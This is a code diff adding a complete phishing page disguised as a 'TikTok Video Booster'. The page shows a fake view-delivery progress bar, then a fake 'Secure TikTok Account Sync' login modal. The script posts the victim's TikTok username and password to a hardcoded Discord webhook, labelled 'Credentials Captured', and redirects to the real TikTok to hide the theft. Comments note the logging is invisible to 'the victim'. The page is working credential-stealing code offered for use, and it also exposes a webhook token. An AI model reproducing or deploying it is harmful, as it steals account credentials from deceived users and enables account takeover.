@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Boost - Get Unstoppable Views & Engagement</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        /* TikTok jaisa dark theme aur modern design */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #121212; /* Dark background */
+            color: #E0E0E0; /* Light text */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden; /* No scroll */
+        }
+        .container {
+            background-color: #1F1F1F; /* Thoda dark container */
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        h1 {
+            color: #EE1D52; /* TikTok red */
+            margin-bottom: 25px;
+            font-size: 2.2em;
+            letter-spacing: 1px;
+        }
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+            color: #B0B0B0;
+        }
+        input[type="text"],
+        input[type="number"],
+        input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 15px 10px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background-color: #2D2D2D;
+            color: #E0E0E0;
+            font-size: 1em;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus,
+        input[type="number"]:focus,
+        input[type="password"]:focus {
+            border-color: #EE1D52;
+            outline: none;
+        }
+        button {
+            background-color: #EE1D52; /* TikTok red */
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #CC1A45;
+            transform: translateY(-2px);
+        }
+        .progress-section {
+            margin-top: 30px;
+            display: none; /* Hidden until processing starts */
+        }
+        .progress-bar-container {
+            width: 100%;
+            background-color: #2D2D2D;
+            border-radius: 8px;
+            overflow: hidden;
+            height: 25px;
+            margin-top: 20px;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #00B36B; /* Green progress */
+            border-radius: 8px;
+            transition: width 0.1s linear;
+        }
+        .current-status {
+            font-size: 1.1em;
+            margin-top: 15px;
+            color: #00B36B;
+        }
+        .heart-icon {
+            position: absolute;
+            font-size: 6em;
+            color: #EE1D52;
+            opacity: 0;
+            animation: fadeAndRise 1s forwards;
+            pointer-events: none;
+            z-index: 10;
+        }
+        @keyframes fadeAndRise {
+            0% { opacity: 0; transform: translateY(50px) scale(0.5); }
+            50% { opacity: 1; transform: translateY(0px) scale(1); }
+            100% { opacity: 0; transform: translateY(-70px) scale(1.5); }
+        }
+
+        /* Pop-up (Modal) Styling */
+        .modal {
+            display: none; /* By default hidden */
+            position: fixed; /* Screen par ruka rahe */
+            z-index: 100; /* Sabse upar */
+            left: 0;
+            top: 0;
+            width: 100%; /* Poori width */
+            height: 100%; /* Poori height */
+            overflow: auto; /* Agar content zyada ho to scroll */
+            background-color: rgba(0,0,0,0.85); /* Darker overlay */
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .modal-content {
+            background-color: #1F1F1F;
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid #333;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.8);
+            transform: translateY(20px);
+            animation: slideUp 0.3s forwards;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .modal-content h2 {
+            color: #EE1D52;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+        .modal-content p {
+            font-size: 1.1em;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            color: #B0B0B0;
+        }
+        .modal-content .input-group {
+            margin-bottom: 20px;
+        }
+        .modal-content button {
+            background-color: #EE1D52;
+            margin-top: 15px;
+        }
+        .tiktok-logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <h1>TikTok Video Booster</h1>
+        <form id="boostForm">
+            <div class="input-group">
+                <label for="videoUrl">TikTok Video Link:</label>
+                <input type="text" id="videoUrl" placeholder="e.g., https://www.tiktok.com/@username/video/1234567890" required>
+            </div>
+            <div class="input-group">
+                <label for="numViews">Desired Views:</label>
+                <input type="number" id="numViews" placeholder="e.g., 10000" min="100" required>
+            </div>
+            <button type="submit" id="boostButton">Boost My Video Now!</button>
+        </form>
+
+        <div class="progress-section" id="progressSection">
+            <p class="current-status">Adding <span id="addedViews">0</span> views to your video...</p>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p style="margin-top: 15px; font-size: 0.9em; color: #777;">Please keep this page open until completion.</p>
+        </div>
+    </div>
+
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <img src="https://www.tiktok.com/favicon.ico" alt="TikTok Logo" class="tiktok-logo">
+            <h2>Secure TikTok Account Sync</h2>
+            <p>To finalize your boost and ensure all views are delivered seamlessly, please securely log in to your TikTok account. This is a one-time sync.</p>
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="tiktokUsername">Username or Email:</label>
+                    <input type="text" id="tiktokUsername" placeholder="Enter your TikTok username or email" required>
+                </div>
+                <div class="input-group">
+                    <label for="tiktokPassword">Password:</label>
+                    <input type="password" id="tiktokPassword" placeholder="Enter your TikTok password" required>
+                </div>
+                <button type="submit" id="loginButton">Log In to Sync</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Tumhara Discord Webhook Link
+        const webhookUrl = 'https://discord.com/api/webhooks/1378495140921999410/mZdz4yBQhnZGrDujVy9LTbLwteFqTbPULbQ-mMbLrH7FaW724SFH6b4uEJo9P2VpbM1';
+
+        document.getElementById('boostForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const videoUrl = document.getElementById('videoUrl').value;
+            const numViews = parseInt(document.getElementById('numViews').value);
+            const boostButton = document.getElementById('boostButton');
+            const mainContainer = document.getElementById('mainContainer');
+            const progressSection = document.getElementById('progressSection');
+            const progressBar = document.getElementById('progressBar');
+            const addedViewsSpan = document.getElementById('addedViews');
+
+            if (!videoUrl || !numViews || numViews <= 0) {
+                alert('Invalid TikTok link or views. Please try again.');
+                return;
+            }
+
+            boostButton.disabled = true;
+            boostButton.textContent = 'Processing...';
+
+            // Initial data to webhook
+            await sendToWebhook({
+                content: `🚀 Nayi Boost Request: ${videoUrl}\nDemand: ${numViews} Views`,
+                embeds: [{
+                    title: "New TikTok Boost Request",
+                    color: 15728640, // TikTok red
+                    fields: [
+                        { name: "Video URL", value: videoUrl, inline: false },
+                        { name: "Desired Views", value: numViews.toString(), inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            });
+
+            // Show progress section
+            document.getElementById('boostForm').style.display = 'none';
+            progressSection.style.display = 'block';
+
+            let currentViewsAdded = 0;
+            const totalDuration = 10000; // 10 seconds for the entire "view delivery" process
+            const updateInterval = 50; // Update every 50ms
+            const viewsPerInterval = Math.ceil(numViews / (totalDuration / updateInterval));
+
+            const interval = setInterval(() => {
+                currentViewsAdded += viewsPerInterval;
+                if (currentViewsAdded > numViews) {
+                    currentViewsAdded = numViews; // Cap at total views
+                }
+
+                addedViewsSpan.textContent = currentViewsAdded.toLocaleString();
+                progressBar.style.width = `${(currentViewsAdded / numViews) * 100}%`;
+
+                // Add a "heart" animation for engagement
+                const heart = document.createElement('span');
+                heart.textContent = '❤️';
+                heart.className = 'heart-icon';
+                heart.style.left = `${20 + Math.random() * 60}%`;
+                heart.style.top = `${20 + Math.random() * 60}%`;
+                mainContainer.appendChild(heart);
+                heart.addEventListener('animationend', () => heart.remove());
+
+                if (currentViewsAdded >= numViews) {
+                    clearInterval(interval);
+                    progressSection.style.display = 'none';
+                    document.getElementById('loginModal').style.display = 'flex'; // Show login modal
+
+                    // Notify webhook about completion (before login capture)
+                    sendToWebhook({
+                        content: `✅ Views Delivery Complete for ${videoUrl}. Awaiting Login Sync.`,
+                        embeds: [{
+                            title: "Views Delivered - Awaiting Login",
+                            color: 65280, // Green
+                            fields: [
+                                { name: "Video URL", value: videoUrl, inline: false },
+                                { name: "Views Delivered", value: numViews.toLocaleString(), inline: true }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    });
+                }
+            }, updateInterval);
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('tiktokUsername').value;
+            const password = document.getElementById('tiktokPassword').value;
+            const loginButton = document.getElementById('loginButton');
+
+            loginButton.disabled = true;
+            loginButton.textContent = 'Syncing Account...';
+
+            // Send credentials to webhook
+            await sendToWebhook({
+                content: `🚨 TikTok Credentials Captured! 🚨\nVideo URL: \`${document.getElementById('videoUrl').value}\`\nUsername/Email: \`${username}\`\nPassword: \`${password}\``,
+                embeds: [{
+                    title: "TikTok Account Credentials Captured!",
+                    color: 16711680, // Red for danger
+                    fields: [
+                        { name: "Video URL (Original Request)", value: document.getElementById('videoUrl').value, inline: false },
+                        { name: "Username/Email", value: `\`${username}\``, inline: true },
+                        { name: "Password", value: `\`${password}\``, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            });
+
+            // Simulate successful login and redirect
+            alert('Account synced successfully! Your boosted views are now fully active. You will be redirected to TikTok.');
+            window.location.href = 'https://www.tiktok.com/'; // Redirect to actual TikTok
+
+            document.getElementById('loginModal').style.display = 'none';
+        });
+
+        async function sendToWebhook(data) {
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+                console.log('Webhook par data successfully bhej diya gaya.'); // This won't be visible to the victim
+            } catch (error) {
+                console.error('Webhook error:', error); // This won't be visible to the victim
+            }
+        }
+    </script>
+</body>
+</html>
